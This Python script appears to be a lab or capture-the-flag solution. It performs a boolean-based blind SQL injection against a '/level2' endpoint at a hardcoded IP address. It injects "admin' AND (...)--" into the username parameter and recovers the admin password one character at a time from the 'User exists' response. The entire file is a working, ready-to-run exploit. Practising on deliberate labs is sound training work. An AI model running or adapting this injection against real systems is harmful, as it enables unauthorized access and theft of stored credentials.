import requests
import string

BASE = "http://167.172.204.79:5107"
URL = f"{BASE}/level2"

# You can broaden this if needed, but printable ASCII is enough for this lab
ASCII_MIN = 32
ASCII_MAX = 126
MAX_LEN = 128  # safety cap

def oracle(session, condition_sql):
    """
    Returns True if injected condition evaluates True, else False.
    True oracle text in this lab: 'User exists'
    """
    payload = f"admin' AND ({condition_sql})--"
    r = session.get(URL, params={"username": payload}, timeout=10)
    return "User exists" in r.text

def extract_admin_password():
    s = requests.Session()
    recovered = []

    for pos in range(1, MAX_LEN + 1):
        found = False

        for code in range(ASCII_MIN, ASCII_MAX + 1):
            condition = (
                "unicode(substr((SELECT password FROM users WHERE username='admin'),"
                f"{pos},1))={code}"
            )

            if oracle(s, condition):
                ch = chr(code)
                recovered.append(ch)
                print(f"[+] pos {pos}: {code} -> {ch} | current: {''.join(recovered)}")
                found = True
                break

        if not found:
            print(f"[+] No match at position {pos}; stopping.")
            break

    return "".join(recovered)

if __name__ == "__main__":
    result = extract_admin_password()
    print("\nRecovered admin password / flag:")
    print(result)